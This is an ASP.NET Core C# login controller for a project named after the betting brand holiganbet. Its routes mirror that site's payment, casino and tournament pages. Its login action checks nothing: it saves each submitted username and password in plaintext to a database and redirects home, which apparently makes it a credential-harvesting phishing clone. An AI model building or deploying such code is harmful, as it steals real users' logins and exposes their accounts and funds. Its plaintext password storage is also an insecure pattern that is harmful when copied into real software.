using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using holiganbet.Models;
using holiganbet.Models.Entities;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using holiganbet.Models.AdminViewModels;
using System.Security.Claims;
using Microsoft.EntityFrameworkCore;

namespace holiganbet.Controllers
{
    public class LoginController : Controller
    {
        private readonly HoliganDbContext _db;
        private readonly ILogger<LoginController> _logger;

        public LoginController(HoliganDbContext db, ILogger<LoginController> logger)
        {
            _db = db ?? throw new ArgumentNullException(nameof(db));
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
        }

        [Route("Login/Index")]
        public IActionResult LoginIndex()
        {
            return View();
        }

        [Route("Login/Odemeler")]
        public IActionResult LoginOdemeler()
        {
            return View();
        }

        [Route("Login/Odemeler/Havale")]
        public IActionResult LoginHavale()
        {
            return View();
        }

        [Route("Login/Odemeler/Papara")]
        public IActionResult LoginPapara()
        {
            return View();
        }

        [Route("Login/CanliCasino")]
        public IActionResult LoginCanliCasino()
        {
            return View();
        }

        [Route("Login/Casino")]
        public IActionResult LoginCasino()
        {
            return View();
        }

        [Route("Login/OzelOran")]
        public IActionResult LoginOzelOran()
        {
            return View();
        }

        [Route("Login/OdulluOyunlar")]
        public IActionResult LoginOdulluOyunlar()
        {
            return View();
        }

        [Route("Login/Tombala")]
        public IActionResult LoginTombala()
        {
            return View();
        }

        [Route("Login/Turnuvalar")]
        public IActionResult LoginTurnuvalar()
        {
            return View();
        }

        [Route("Login/OzelTurnuvalar")]
        public IActionResult LoginOzelTurnuvalar()
        {
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Index(LoginsVM gelenData)
        {
            if (!ModelState.IsValid)
            {
                return View(gelenData);
            }

            else
            {
                Login yeniLogin = new Login
                {
                    Username = gelenData.Username,
                    Password = gelenData.Password
                };
                await _db.AddAsync(yeniLogin);
            }
            await _db.SaveChangesAsync();
            return Redirect("/");
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }

}
